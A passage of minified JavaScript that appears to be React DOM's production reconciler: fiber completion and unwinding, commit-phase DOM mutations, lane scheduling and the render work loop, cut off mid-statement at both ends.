3:pu(c.nodeValue,u,(n.mode&1)!==0);break;case 5:n.memoizedProps.suppressHydrationWarning!==!0&&pu(c.nodeValue,u,(n.mode&1)!==0)}m&&(i.flags|=4)}else c=(u.nodeType===9?u:u.ownerDocument).createTextNode(c),c[fn]=i,i.stateNode=c}return bt(i),null;case 13:if(Xe($e),c=i.memoizedState,n===null||n.memoizedState!==null&&n.memoizedState.dehydrated!==null){if(Ge&&Ht!==null&&(i.mode&1)!==0&&(i.flags&128)===0)Zd(),Jr(),i.flags|=98560,m=!1;else if(m=yu(i),c!==null&&c.dehydrated!==null){if(n===null){if(!m)throw Error(r(318));if(m=i.memoizedState,m=m!==null?m.dehydrated:null,!m)throw Error(r(317));m[fn]=i}else Jr(),(i.flags&128)===0&&(i.memoizedState=null),i.flags|=4;bt(i),m=!1}else tn!==null&&(hl(tn),tn=null),m=!0;if(!m)return i.flags&65536?i:null}return(i.flags&128)!==0?(i.lanes=u,i):(c=c!==null,c!==(n!==null&&n.memoizedState!==null)&&c&&(i.child.flags|=8192,(i.mode&1)!==0&&(n===null||($e.current&1)!==0?ut===0&&(ut=3):gl())),i.updateQueue!==null&&(i.flags|=4),bt(i),null);case 4:return ni(),nl(n,i),n===null&&Gi(i.stateNode.containerInfo),bt(i),null;case 10:return vs(i.type._context),bt(i),null;case 17:return It(i.type)&&Eu(),bt(i),null;case 19:if(Xe($e),m=i.memoizedState,m===null)return bt(i),null;if(c=(i.flags&128)!==0,b=m.rendering,b===null)if(c)aa(m,!1);else{if(ut!==0||n!==null&&(n.flags&128)!==0)for(n=i.child;n!==null;){if(b=Iu(n),b!==null){for(i.flags|=128,aa(m,!1),c=b.updateQueue,c!==null&&(i.updateQueue=c,i.flags|=4),i.subtreeFlags=0,c=u,u=i.child;u!==null;)m=u,n=c,m.flags&=14680066,b=m.alternate,b===null?(m.childLanes=0,m.lanes=n,m.child=null,m.subtreeFlags=0,m.memoizedProps=null,m.memoizedState=null,m.updateQueue=null,m.dependencies=null,m.stateNode=null):(m.childLanes=b.childLanes,m.lanes=b.lanes,m.child=b.child,m.subtreeFlags=0,m.deletions=null,m.memoizedProps=b.memoizedProps,m.memoizedState=b.memoizedState,m.updateQueue=b.updateQueue,m.type=b.type,n=b.dependencies,m.dependencies=n===null?null:{lanes:n.lanes,firstContext:n.firstContext}),u=u.sibling;return je($e,$e.current&1|2),i.child}n=n.sibling}m.tail!==null&&Ze()>ui&&(i.flags|=128,c=!0,aa(m,!1),i.lanes=4194304)}else{if(!c)if(n=Iu(b),n!==null){if(i.flags|=128,c=!0,u=n.updateQueue,u!==null&&(i.updateQueue=u,i.flags|=4),aa(m,!0),m.tail===null&&m.tailMode==="hidden"&&!b.alternate&&!Ge)return bt(i),null}else 2*Ze()-m.renderingStartTime>ui&&u!==1073741824&&(i.flags|=128,c=!0,aa(m,!1),i.lanes=4194304);m.isBackwards?(b.sibling=i.child,i.child=b):(u=m.last,u!==null?u.sibling=b:i.child=b,m.last=b)}return m.tail!==null?(i=m.tail,m.rendering=i,m.tail=i.sibling,m.renderingStartTime=Ze(),i.sibling=null,u=$e.current,je($e,c?u&1|2:u&1),i):(bt(i),null);case 22:case 23:return ml(),c=i.memoizedState!==null,n!==null&&n.memoizedState!==null!==c&&(i.flags|=8192),c&&(i.mode&1)!==0?(Ut&1073741824)!==0&&(bt(i),i.subtreeFlags&6&&(i.flags|=8192)):bt(i),null;case 24:return null;case 25:return null}throw Error(r(156,i.tag))}function Hg(n,i){switch(xs(i),i.tag){case 1:return It(i.type)&&Eu(),n=i.flags,n&65536?(i.flags=n&-65537|128,i):null;case 3:return ni(),Xe(kt),Xe(Et),Fs(),n=i.flags,(n&65536)!==0&&(n&128)===0?(i.flags=n&-65537|128,i):null;case 5:return Ds(i),null;case 13:if(Xe($e),n=i.memoizedState,n!==null&&n.dehydrated!==null){if(i.alternate===null)throw Error(r(340));Jr()}return n=i.flags,n&65536?(i.flags=n&-65537|128,i):null;case 19:return Xe($e),null;case 4:return ni(),null;case 10:return vs(i.type._context),null;case 22:case 23:return ml(),null;case 24:return null;default:return null}}var Fu=!1,_t=!1,Ug=typeof WeakSet=="function"?WeakSet:Set,se=null;function ii(n,i){var u=n.ref;if(u!==null)if(typeof u=="function")try{u(null)}catch(c){Ke(n,i,c)}else u.current=null}function rl(n,i,u){try{u()}catch(c){Ke(n,i,c)}}var Jf=!1;function zg(n,i){if(ms=ru,n=Nd(),os(n)){if("selectionStart"in n)var u={start:n.selectionStart,end:n.selectionEnd};else e:{u=(u=n.ownerDocument)&&u.defaultView||window;var c=u.getSelection&&u.getSelection();if(c&&c.rangeCount!==0){u=c.anchorNode;var f=c.anchorOffset,m=c.focusNode;c=c.focusOffset;try{u.nodeType,m.nodeType}catch{u=null;break e}var b=0,A=-1,N=-1,U=0,$=0,q=n,G=null;t:for(;;){for(var ae;q!==u||f!==0&&q.nodeType!==3||(A=b+f),q!==m||c!==0&&q.nodeType!==3||(N=b+c),q.nodeType===3&&(b+=q.nodeValue.length),(ae=q.firstChild)!==null;)G=q,q=ae;for(;;){if(q===n)break t;if(G===u&&++U===f&&(A=b),G===m&&++$===c&&(N=b),(ae=q.nextSibling)!==null)break;q=G,G=q.parentNode}q=ae}u=A===-1||N===-1?null:{start:A,end:N}}else u=null}u=u||{start:0,end:0}}else u=null;for(gs={focusedElem:n,selectionRange:u},ru=!1,se=i;se!==null;)if(i=se,n=i.child,(i.subtreeFlags&1028)!==0&&n!==null)n.return=i,se=n;else for(;se!==null;){i=se;try{var le=i.alternate;if((i.flags&1024)!==0)switch(i.tag){case 0:case 11:case 15:break;case 1:if(le!==null){var fe=le.memoizedProps,et=le.memoizedState,D=i.stateNode,R=D.getSnapshotBeforeUpdate(i.elementType===i.type?fe:nn(i.type,fe),et);D.__reactInternalSnapshotBeforeUpdate=R}break;case 3:var B=i.stateNode.containerInfo;B.nodeType===1?B.textContent="":B.nodeType===9&&B.documentElement&&B.removeChild(B.documentElement);break;case 5:case 6:case 4:case 17:break;default:throw Error(r(163))}}catch(Z){Ke(i,i.return,Z)}if(n=i.sibling,n!==null){n.return=i.return,se=n;break}se=i.return}return le=Jf,Jf=!1,le}function ua(n,i,u){var c=i.updateQueue;if(c=c!==null?c.lastEffect:null,c!==null){var f=c=c.next;do{if((f.tag&n)===n){var m=f.destroy;f.destroy=void 0,m!==void 0&&rl(i,u,m)}f=f.next}while(f!==c)}}function Bu(n,i){if(i=i.updateQueue,i=i!==null?i.lastEffect:null,i!==null){var u=i=i.next;do{if((u.tag&n)===n){var c=u.create;u.destroy=c()}u=u.next}while(u!==i)}}function il(n){var i=n.ref;if(i!==null){var u=n.stateNode;n.tag,n=u,typeof i=="function"?i(n):i.current=n}}function Zf(n){var i=n.alternate;i!==null&&(n.alternate=null,Zf(i)),n.child=null,n.deletions=null,n.sibling=null,n.tag===5&&(i=n.stateNode,i!==null&&(delete i[fn],delete i[$i],delete i[_s],delete i[Cg],delete i[xg])),n.stateNode=null,n.return=null,n.dependencies=null,n.memoizedProps=null,n.memoizedState=null,n.pendingProps=null,n.stateNode=null,n.updateQueue=null}function e0(n){return n.tag===5||n.tag===3||n.tag===4}function t0(n){e:for(;;){for(;n.sibling===null;){if(n.return===null||e0(n.return))return null;n=n.return}for(n.sibling.return=n.return,n=n.sibling;n.tag!==5&&n.tag!==6&&n.tag!==18;){if(n.flags&2||n.child===null||n.tag===4)continue e;n.child.return=n,n=n.child}if(!(n.flags&2))return n.stateNode}}function al(n,i,u){var c=n.tag;if(c===5||c===6)n=n.stateNode,i?u.nodeType===8?u.parentNode.insertBefore(n,i):u.insertBefore(n,i):(u.nodeType===8?(i=u.parentNode,i.insertBefore(n,u)):(i=u,i.appendChild(n)),u=u._reactRootContainer,u!=null||i.onclick!==null||(i.onclick=mu));else if(c!==4&&(n=n.child,n!==null))for(al(n,i,u),n=n.sibling;n!==null;)al(n,i,u),n=n.sibling}function ul(n,i,u){var c=n.tag;if(c===5||c===6)n=n.stateNode,i?u.insertBefore(n,i):u.appendChild(n);else if(c!==4&&(n=n.child,n!==null))for(ul(n,i,u),n=n.sibling;n!==null;)ul(n,i,u),n=n.sibling}var mt=null,rn=!1;function Vn(n,i,u){for(u=u.child;u!==null;)n0(n,i,u),u=u.sibling}function n0(n,i,u){if(dn&&typeof dn.onCommitFiberUnmount=="function")try{dn.onCommitFiberUnmount(Ka,u)}catch{}switch(u.tag){case 5:_t||ii(u,i);case 6:var c=mt,f=rn;mt=null,Vn(n,i,u),mt=c,rn=f,mt!==null&&(rn?(n=mt,u=u.stateNode,n.nodeType===8?n.parentNode.removeChild(u):n.removeChild(u)):mt.removeChild(u.stateNode));break;case 18:mt!==null&&(rn?(n=mt,u=u.stateNode,n.nodeType===8?bs(n.parentNode,u):n.nodeType===1&&bs(n,u),Bi(n)):bs(mt,u.stateNode));break;case 4:c=mt,f=rn,mt=u.stateNode.containerInfo,rn=!0,Vn(n,i,u),mt=c,rn=f;break;case 0:case 11:case 14:case 15:if(!_t&&(c=u.updateQueue,c!==null&&(c=c.lastEffect,c!==null))){f=c=c.next;do{var m=f,b=m.destroy;m=m.tag,b!==void 0&&((m&2)!==0||(m&4)!==0)&&rl(u,i,b),f=f.next}while(f!==c)}Vn(n,i,u);break;case 1:if(!_t&&(ii(u,i),c=u.stateNode,typeof c.componentWillUnmount=="function"))try{c.props=u.memoizedProps,c.state=u.memoizedState,c.componentWillUnmount()}catch(A){Ke(u,i,A)}Vn(n,i,u);break;case 21:Vn(n,i,u);break;case 22:u.mode&1?(_t=(c=_t)||u.memoizedState!==null,Vn(n,i,u),_t=c):Vn(n,i,u);break;default:Vn(n,i,u)}}function r0(n){var i=n.updateQueue;if(i!==null){n.updateQueue=null;var u=n.stateNode;u===null&&(u=n.stateNode=new Ug),i.forEach(function(c){var f=qg.bind(null,n,c);u.has(c)||(u.add(c),c.then(f,f))})}}function an(n,i){var u=i.deletions;if(u!==null)for(var c=0;c<u.length;c++){var f=u[c];try{var m=n,b=i,A=b;e:for(;A!==null;){switch(A.tag){case 5:mt=A.stateNode,rn=!1;break e;case 3:mt=A.stateNode.containerInfo,rn=!0;break e;case 4:mt=A.stateNode.containerInfo,rn=!0;break e}A=A.return}if(mt===null)throw Error(r(160));n0(m,b,f),mt=null,rn=!1;var N=f.alternate;N!==null&&(N.return=null),f.return=null}catch(U){Ke(f,i,U)}}if(i.subtreeFlags&12854)for(i=i.child;i!==null;)i0(i,n),i=i.sibling}function i0(n,i){var u=n.alternate,c=n.flags;switch(n.tag){case 0:case 11:case 14:case 15:if(an(i,n),mn(n),c&4){try{ua(3,n,n.return),Bu(3,n)}catch(fe){Ke(n,n.return,fe)}try{ua(5,n,n.return)}catch(fe){Ke(n,n.return,fe)}}break;case 1:an(i,n),mn(n),c&512&&u!==null&&ii(u,u.return);break;case 5:if(an(i,n),mn(n),c&512&&u!==null&&ii(u,u.return),n.flags&32){var f=n.stateNode;try{Me(f,"")}catch(fe){Ke(n,n.return,fe)}}if(c&4&&(f=n.stateNode,f!=null)){var m=n.memoizedProps,b=u!==null?u.memoizedProps:m,A=n.type,N=n.updateQueue;if(n.updateQueue=null,N!==null)try{A==="input"&&m.type==="radio"&&m.name!=null&&ki(f,m),cn(A,b);var U=cn(A,m);for(b=0;b<N.length;b+=2){var $=N[b],q=N[b+1];$==="style"?Dn(f,q):$==="dangerouslySetInnerHTML"?Re(f,q):$==="children"?Me(f,q):j(f,$,q,U)}switch(A){case"input":Mr(f,m);break;case"textarea":Xa(f,m);break;case"select":var G=f._wrapperState.wasMultiple;f._wrapperState.wasMultiple=!!m.multiple;var ae=m.value;ae!=null?wn(f,!!m.multiple,ae,!1):G!==!!m.multiple&&(m.defaultValue!=null?wn(f,!!m.multiple,m.defaultValue,!0):wn(f,!!m.multiple,m.multiple?[]:"",!1))}f[$i]=m}catch(fe){Ke(n,n.return,fe)}}break;case 6:if(an(i,n),mn(n),c&4){if(n.stateNode===null)throw Error(r(162));f=n.stateNode,m=n.memoizedProps;try{f.nodeValue=m}catch(fe){Ke(n,n.return,fe)}}break;case 3:if(an(i,n),mn(n),c&4&&u!==null&&u.memoizedState.isDehydrated)try{Bi(i.containerInfo)}catch(fe){Ke(n,n.return,fe)}break;case 4:an(i,n),mn(n);break;case 13:an(i,n),mn(n),f=n.child,f.flags&8192&&(m=f.memoizedState!==null,f.stateNode.isHidden=m,!m||f.alternate!==null&&f.alternate.memoizedState!==null||(ll=Ze())),c&4&&r0(n);break;case 22:if($=u!==null&&u.memoizedState!==null,n.mode&1?(_t=(U=_t)||$,an(i,n),_t=U):an(i,n),mn(n),c&8192){if(U=n.memoizedState!==null,(n.stateNode.isHidden=U)&&!$&&(n.mode&1)!==0)for(se=n,$=n.child;$!==null;){for(q=se=$;se!==null;){switch(G=se,ae=G.child,G.tag){case 0:case 11:case 14:case 15:ua(4,G,G.return);break;case 1:ii(G,G.return);var le=G.stateNode;if(typeof le.componentWillUnmount=="function"){c=G,u=G.return;try{i=c,le.props=i.memoizedProps,le.state=i.memoizedState,le.componentWillUnmount()}catch(fe){Ke(c,u,fe)}}break;case 5:ii(G,G.return);break;case 22:if(G.memoizedState!==null){o0(q);continue}}ae!==null?(ae.return=G,se=ae):o0(q)}$=$.sibling}e:for($=null,q=n;;){if(q.tag===5){if($===null){$=q;try{f=q.stateNode,U?(m=f.style,typeof m.setProperty=="function"?m.setProperty("display","none","important"):m.display="none"):(A=q.stateNode,N=q.memoizedProps.style,b=N!=null&&N.hasOwnProperty("display")?N.display:null,A.style.display=jt("display",b))}catch(fe){Ke(n,n.return,fe)}}}else if(q.tag===6){if($===null)try{q.stateNode.nodeValue=U?"":q.memoizedProps}catch(fe){Ke(n,n.return,fe)}}else if((q.tag!==22&&q.tag!==23||q.memoizedState===null||q===n)&&q.child!==null){q.child.return=q,q=q.child;continue}if(q===n)break e;for(;q.sibling===null;){if(q.return===null||q.return===n)break e;$===q&&($=null),q=q.return}$===q&&($=null),q.sibling.return=q.return,q=q.sibling}}break;case 19:an(i,n),mn(n),c&4&&r0(n);break;case 21:break;default:an(i,n),mn(n)}}function mn(n){var i=n.flags;if(i&2){try{e:{for(var u=n.return;u!==null;){if(e0(u)){var c=u;break e}u=u.return}throw Error(r(160))}switch(c.tag){case 5:var f=c.stateNode;c.flags&32&&(Me(f,""),c.flags&=-33);var m=t0(n);ul(n,m,f);break;case 3:case 4:var b=c.stateNode.containerInfo,A=t0(n);al(n,A,b);break;default:throw Error(r(161))}}catch(N){Ke(n,n.return,N)}n.flags&=-3}i&4096&&(n.flags&=-4097)}function Wg(n,i,u){se=n,a0(n)}function a0(n,i,u){for(var c=(n.mode&1)!==0;se!==null;){var f=se,m=f.child;if(f.tag===22&&c){var b=f.memoizedState!==null||Fu;if(!b){var A=f.alternate,N=A!==null&&A.memoizedState!==null||_t;A=Fu;var U=_t;if(Fu=b,(_t=N)&&!U)for(se=f;se!==null;)b=se,N=b.child,b.tag===22&&b.memoizedState!==null?s0(f):N!==null?(N.return=b,se=N):s0(f);for(;m!==null;)se=m,a0(m),m=m.sibling;se=f,Fu=A,_t=U}u0(n)}else(f.subtreeFlags&8772)!==0&&m!==null?(m.return=f,se=m):u0(n)}}function u0(n){for(;se!==null;){var i=se;if((i.flags&8772)!==0){var u=i.alternate;try{if((i.flags&8772)!==0)switch(i.tag){case 0:case 11:case 15:_t||Bu(5,i);break;case 1:var c=i.stateNode;if(i.flags&4&&!_t)if(u===null)c.componentDidMount();else{var f=i.elementType===i.type?u.memoizedProps:nn(i.type,u.memoizedProps);c.componentDidUpdate(f,u.memoizedState,c.__reactInternalSnapshotBeforeUpdate)}var m=i.updateQueue;m!==null&&of(i,m,c);break;case 3:var b=i.updateQueue;if(b!==null){if(u=null,i.child!==null)switch(i.child.tag){case 5:u=i.child.stateNode;break;case 1:u=i.child.stateNode}of(i,b,u)}break;case 5:var A=i.stateNode;if(u===null&&i.flags&4){u=A;var N=i.memoizedProps;switch(i.type){case"button":case"input":case"select":case"textarea":N.autoFocus&&u.focus();break;case"img":N.src&&(u.src=N.src)}}break;case 6:break;case 4:break;case 12:break;case 13:if(i.memoizedState===null){var U=i.alternate;if(U!==null){var $=U.memoizedState;if($!==null){var q=$.dehydrated;q!==null&&Bi(q)}}}break;case 19:case 17:case 21:case 22:case 23:case 25:break;default:throw Error(r(163))}_t||i.flags&512&&il(i)}catch(G){Ke(i,i.return,G)}}if(i===n){se=null;break}if(u=i.sibling,u!==null){u.return=i.return,se=u;break}se=i.return}}function o0(n){for(;se!==null;){var i=se;if(i===n){se=null;break}var u=i.sibling;if(u!==null){u.return=i.return,se=u;break}se=i.return}}function s0(n){for(;se!==null;){var i=se;try{switch(i.tag){case 0:case 11:case 15:var u=i.return;try{Bu(4,i)}catch(N){Ke(i,u,N)}break;case 1:var c=i.stateNode;if(typeof c.componentDidMount=="function"){var f=i.return;try{c.componentDidMount()}catch(N){Ke(i,f,N)}}var m=i.return;try{il(i)}catch(N){Ke(i,m,N)}break;case 5:var b=i.return;try{il(i)}catch(N){Ke(i,b,N)}}}catch(N){Ke(i,i.return,N)}if(i===n){se=null;break}var A=i.sibling;if(A!==null){A.return=i.return,se=A;break}se=i.return}}var jg=Math.ceil,Hu=ie.ReactCurrentDispatcher,ol=ie.ReactCurrentOwner,Vt=ie.ReactCurrentBatchConfig,Fe=0,lt=null,rt=null,gt=0,Ut=0,ai=jn(0),ut=0,oa=null,Sr=0,Uu=0,sl=0,sa=null,vt=null,ll=0,ui=1/0,Nn=null,zu=!1,cl=null,$n=null,Wu=!1,qn=null,ju=0,la=0,dl=null,Qu=-1,Yu=0;function At(){return(Fe&6)!==0?Ze():Qu!==-1?Qu:Qu=Ze()}function Kn(n){return(n.mode&1)===0?1:(Fe&2)!==0&&gt!==0?gt&-gt:Lg.transition!==null?(Yu===0&&(Yu=ed()),Yu):(n=ze,n!==0||(n=window.event,n=n===void 0?16:ld(n.type)),n)}function un(n,i,u,c){if(50<la)throw la=0,dl=null,Error(r(185));Pi(n,u,c),((Fe&2)===0||n!==lt)&&(n===lt&&((Fe&2)===0&&(Uu|=u),ut===4&&Jn(n,gt)),Rt(n,c),u===1&&Fe===0&&(i.mode&1)===0&&(ui=Ze()+500,bu&&Yn()))}function Rt(n,i){var u=n.callbackNode;L1(n,i);var c=eu(n,n===lt?gt:0);if(c===0)u!==null&&Kc(u),n.callbackNode=null,n.callbackPriority=0;else if(i=c&-c,n.callbackPriority!==i){if(u!=null&&Kc(u),i===1)n.tag===0?Ag(c0.bind(null,n)):Vd(c0.bind(null,n)),Sg(function(){(Fe&6)===0&&Yn()}),u=null;else{switch(td(c)){case 1:u=Qo;break;case 4:u=Jc;break;case 16:u=qa;break;case 536870912:u=Zc;break;default:u=qa}u=T0(u,l0.bind(null,n))}n.callbackPriority=i,n.callbackNode=u}}function l0(n,i){if(Qu=-1,Yu=0,(Fe&6)!==0)throw Error(r(327));var u=n.callbackNode;if(oi()&&n.callbackNode!==u)return null;var c=eu(n,n===lt?gt:0);if(c===0)return null;if((c&30)!==0||(c&n.expiredLanes)!==0||i)i=Xu(n,c);else{i=c;var f=Fe;Fe|=2;var m=f0();(lt!==n||gt!==i)&&(Nn=null,ui=Ze()+500,Cr(n,i));do try{Xg();break}catch(A){d0(n,A)}while(!0);Ns(),Hu.current=m,Fe=f,rt!==null?i=0:(lt=null,gt=0,i=ut)}if(i!==0){if(i===2&&(f=Yo(n),f!==0&&(c=f,i=fl(n,f))),i===1)throw u=oa,Cr(n,0),Jn(n,c),Rt(n,Ze()),u;if(i===6)Jn(n,c);else{if(f=n.current.alternate,(c&30)===0&&!Qg(f)&&(i=Xu(n,c),i===2&&(m=Yo(n),m!==0&&(c=m,i=fl(n,m))),i===1))throw u=oa,Cr(n,0),Jn(n,c),Rt(n,Ze()),u;switch(n.finishedWork=f,n.finishedLanes=c,i){case 0:case 1:throw Error(r(345));case 2:xr(n,vt,Nn);break;case 3:if(Jn(n,c),(c&130023424)===c&&(i=ll+500-Ze(),10<i)){if(eu(n,0)!==0)break;if(f=n.suspendedLanes,(f&c)!==c){At(),n.pingedLanes|=n.suspendedLanes&f;break}n.timeoutHandle=Ts(xr.bind(null,n,vt,Nn),i);break}xr(n,vt,Nn);break;case 4:if(Jn(n,c),(c&4194240)===c)break;for(i=n.eventTimes,f=-1;0<c;){var b=31-Zt(c);m=1<<b,b=i[b],b>f&&(f=b),c&=~m}if(c=f,c=Ze()-c,c=(120>c?120:480>c?480:1080>c?1080:1920>c?1920:3e3>c?3e3:4320>c?4320:1960*jg(c/1960))-c,10<c){n.timeoutHandle=Ts(xr.bind(null,n,vt,Nn),c);break}xr(n,vt,Nn);break;case 5:xr(n,vt,Nn);break;default:throw Error(r(329))}}}return Rt(n,Ze()),n.callbackNode===u?l0.bind(null,n):null}function fl(n,i){var u=sa;return n.current.memoizedState.isDehydrated&&(Cr(n,i).flags|=256),n=Xu(n,i),n!==2&&(i=vt,vt=u,i!==null&&hl(i)),n}function hl(n){vt===null?vt=n:vt.push.apply(vt,n)}function Qg(n){for(var i=n;;){if(i.flags&16384){var u=i.updateQueue;if(u!==null&&(u=u.stores,u!==null))for(var c=0;c<u.length;c++){var f=u[c],m=f.getSnapshot;f=f.value;try{if(!en(m(),f))return!1}catch{return!1}}}if(u=i.child,i.subtreeFlags&16384&&u!==null)u.return=i,i=u;else{if(i===n)break;for(;i.sibling===null;){if(i.return===null||i.return===n)return!0;i=i.return}i.sibling.return=i.return,i=i.sibling}}return!0}function Jn(n,i){for(i&=~sl,i&=~Uu,n.suspendedLanes|=i,n.pingedLanes&=~i,n=n.expirationTimes;0<i;){var u=31-Zt(i),c=1<<u;n[u]=-1,i&=~c}}function c0(n){if((Fe&6)!==0)throw Error(r(327));oi();var i=eu(n,0);if((i&1)===0)return Rt(n,Ze()),null;var u=Xu(n,i);if(n.tag!==0&&u===2){var c=Yo(n);c!==0&&(i=c,u=fl(n,c))}if(u===1)throw u=oa,Cr(n,0),Jn(n,i),Rt(n,Ze()),u;if(u===6)throw Error(r(345));return n.finishedWork=n.current.alternate,n.finishedLanes=i,xr(n,vt,Nn),Rt(n,Ze()),null}function pl(n,i){var u=Fe;Fe|=1;try{return n(i)}finally{Fe=u,Fe===0&&(ui=Ze()+500,bu&&Yn())}}function yr(n){qn!==null&&qn.tag===0&&(Fe&6)===0&&oi();var i=Fe;Fe|=1;var u=Vt.transition,c=ze;try{if(Vt.transition=null,ze=1,n)return n()}finally{ze=c,Vt.transition=u,Fe=i,(Fe&6)===0&&Yn()}}function ml(){Ut=ai.current,Xe(ai)}function Cr(n,i){n.finishedWork=null,n.finishedLanes=0;var u=n.timeoutHandle;if(u!==-1&&(n.timeoutHandle=-1,_g(u)),rt!==null)for(u=rt.return;u!==null;){var c=u;switch(xs(c),c.tag){case 1:c=c.type.childContextTypes,c!=null&&Eu();break;case 3:ni(),Xe(kt),Xe(Et),Fs();break;case 5:Ds(c);break;case 4:ni();break;case 13:Xe($e);break;case 19:Xe($e);break;case 10:vs(c.type._context);break;case 22:case 23:ml()}u=u.return}if(lt=n,rt=n=Zn(n.current,null),gt=Ut=i,ut=0,oa=null,sl=Uu=Sr=0,vt=sa=null,Tr!==null){for(i=0;i<Tr.length;i++)if(u=Tr[i],c=u.interleaved,c!==null){u.interleaved=null;var f=c.next,m=u.pending;if(m!==null){var b=m.next;m.next=f,c.next=b}u.pending=c}Tr=null}return n}function d0(n,i){do{var u=rt;try{if(Ns(),Nu.current=Pu,vu){for(var c=qe.memoizedState;c!==null;){var f=c.queue;f!==null&&(f.pending=null),c=c.next}vu=!1}if(_r=0,st=at=qe=null,ta=!1,na=0,ol.current=null,u===null||u.return===null){ut=1,oa=i,rt=null;break}e:{var m=n,b=u.return,A=u,N=i;if(i=gt,A.flags|=32768,N!==null&&typeof N=="object"&&typeof N.then=="function"){var U=N,$=A,q=$.tag;if(($.mode&1)===0&&(q===0||q===11||q===15)){var G=$.alternate;G?($.updateQueue=G.updateQueue,$.memoizedState=G.memoizedState,$.lanes=G.lanes):($.updateQueue=null,$.memoizedState=null)}var ae=Mf(b);if(ae!==null){ae.flags&=-257,Ff(ae,b,A,m,i),ae.mode&1&&Df(m,U,i),i=ae,N=U;var le=i.updateQueue;if(le===null){var fe=new Set;fe.add(N),i.updateQueue=fe}else le.add(N);break e}else{if((i&1)===0){Df(m,U,i),gl();break e}N=Error(r(426))}}else if(Ge&&A.mode&1){var et=Mf(b);if(et!==null){(et.flags&65536)===0&&(et.flags|=256),Ff(et,b,A,m,i),ks(ri(N,A));break e}}m=N=ri(N,A),ut!==4&&(ut=2),sa===null?sa=[m]:sa.push(m),m=b;do{switch(m.tag){case 3:m.flags|=65536,i&=-i,m.lanes|=i;var D=Pf(m,N,i);uf(m,D);break e;case 1:A=N;var R=m.type,B=m.stateNode;if((m.flags&128)===0&&(typeof R.getDerivedStateFromError=="function"||B!==null&&typeof B.componentDidCatch=="function"&&($n===null||!$n.has(B)))){m.flags|=65536,i&=-i,m.lanes|=i;var Z=wf(m,A,i);uf(m,Z);break e}}m=m.return}while(m!==null)}p0(u)}catch(he){i=he,rt===u&&u!==null&&(rt=u=u.return);continue}break}while(!0)}function f0(){var n=Hu.current;return Hu.current=Pu,n===null?Pu:n}function gl(){(ut===0||ut===3||ut===2)&&(ut=4),lt===null||(Sr&268435455)===0&&(Uu&268435455)===0||Jn(lt,gt)}function Xu(n,i){var u=Fe;Fe|=2;var c=f0();(lt!==n||gt!==i)&&(Nn=null,Cr(n,i));do try{Yg();break}catch(f){d0(n,f)}while(!0);if(Ns(),Fe=u,Hu.current=c,rt!==null)throw Error(r(261));return lt=null,gt=0,ut}function Yg(){for(;rt!==null;)h0(rt)}function Xg(){for(;rt!==null&&!E1();)h0(rt)}function h0(n){var i=E0(n.alternate,n,Ut);n.memoizedProps=n.pendingProps,i===null?p0(n):rt=i,ol.current=null}function p0(n){var i=n;do{var u=i.alternate;if(n=i.return,(i.flags&32768)===0){if(u=Bg(u,i,Ut),u!==null){rt=u;return}}else{if(u=Hg(u,i),u!==null){u.flags&=32767,rt=u;return}if(n!==null)n.flags|=32768,n.subtreeFlags=0,n.deletions=null;else{ut=6,rt=null;return}}if(i=i.sibling,i!==null){rt=i;return}rt=i=n}while(i!==null);ut===0&&(ut=5)}function xr(n,i,u){var c=ze,f=Vt.transition;try{Vt.transition=null,ze=1,Gg(n,i,u,c)}finally{Vt.transition=f,ze=c}return null}function Gg(n,i,u,c){do oi();while(qn!==null);if((Fe&6)!==0)throw Error(r(327));u=n.finishedWork;var f=n.finishedLanes;if(u===null)return null;if(n.finishedWork=null,n.finishedLanes=0,u===n.current)throw Error(r(177));n.callbackNode=null,n.callbackPriority=0;var m=u.lanes|u.childLanes;if(k1(n,m),n===lt&&(rt=lt=null,gt=0),(u.subtreeFlags&2064)===0&&(u.flags&2064)===0||Wu||(Wu=!0,T0(qa,function(){return oi(),null})),m=(u.flags&15990)!==0,(u.subtreeFlags&15990)!==0||m){m=Vt.transition,Vt.transition=null;var b=ze;ze=1;var A=Fe;Fe|=4,ol.current=null,zg(n,u),i0(u,n),hg(gs),ru=!!ms,gs=ms=null,n.current=u,Wg(u),T1(),Fe=A,ze=b,Vt.transition=m}else n.current=u;if(Wu&&(Wu=!1,qn=n,ju=f),m=n.pendingLanes,m===0&&($n=null),S1(u.stateNode),Rt(n,Ze()),i!==null)for(c=n.onRecoverableError,u=0;u<i.length;u++)f=i[u],c(f.value,{componentStack:f.stack,digest:f.digest});if(zu)throw zu=!1,n=cl,cl=null,n;return(ju&1)!==0&&n.tag!==0&&oi(),m=n.pendingLanes,(m&1)!==0?n===dl?la++:(la=0,dl=n):la=0,Yn(),null}function oi(){if(qn!==null){var n=td(ju),i=Vt.transition,u=ze;try{if(Vt.transition=null,ze=16>n?16:n,qn===null)var c=!1;else{if(n=qn,qn=null,ju=0,(Fe&6)!==0)throw Error(r(331));var f=Fe;for(Fe|=4,se=n.current;se!==null;){var m=se,b=m.child;if((se.flags&16)!==0){var A=m.deletions;if(A!==null){for(var N=0;N<A.length;N++){var U=A[N];for(se=U;se!==null;){var $=se;switch($.tag){case 0:case 11:case 15:ua(8,$,m)}var q=$.child;if(q!==null)q.return=$,se=q;else for(;se!==null;){$=se;var G=$.sibling,ae=$.return;if(Zf($),$===U){se=null;break}if(G!==null){G.return=ae,se=G;break}se=ae}}}var le=m.alternate;if(le!==null){var fe=le.child;if(fe!==null){le.child=null;do{var et=fe.sibling;fe.sibling=null,fe=et}while(fe!==null)}}se=m}}if((m.subtreeFlags&2064)!==0&&b!==null)b.return=m,se=b;else e:for(;se!==null;){if(m=se,(m.flags&2048)!==0)switch(m.tag){case 0:case 11:case 15:ua(9,m,m.return)}var D=m.sibling;if(D!==null){D.return=m.return,se=D;break e}se=m.return}}var R=n.current;for(se=R;se!==null;){b=se;var B=b.child;if((b.subtreeFlags&2064)!==0&&B!==null)B.return=b,se=B;else e:for(b=R;se!==null;){if(A=se,(A.flags&2048)!==0)try{switch(A.tag){case 0:case 11:case 15:Bu(9,A)}}catch(he){Ke(A,A.return,he)}if(A===b){se=null;break e}var Z=A.sibling;if(Z!==null){Z.return=A.return,se=Z;break e}se=A.return}}if(Fe=f,Yn(),dn&&typeof dn.onPostCommitFiberRoot=="function")try{dn.onPostCommitFiberRoot(Ka,n)}catch{}c=!0}return c}finally{ze=u,Vt.transition=i}}return!1}function m0(n,i,u){i=ri(u,i),i=Pf(n,i,1),n=Gn(n,i,1),i=At(),n!==null&&(Pi(n,1,i),Rt(n,i))}function Ke(n,i,u){if(n.tag===3)m0(n,n,u);else for(;i!==null;){if(i.tag===3){m0(i,n,u);break}else if(i.tag===1){var 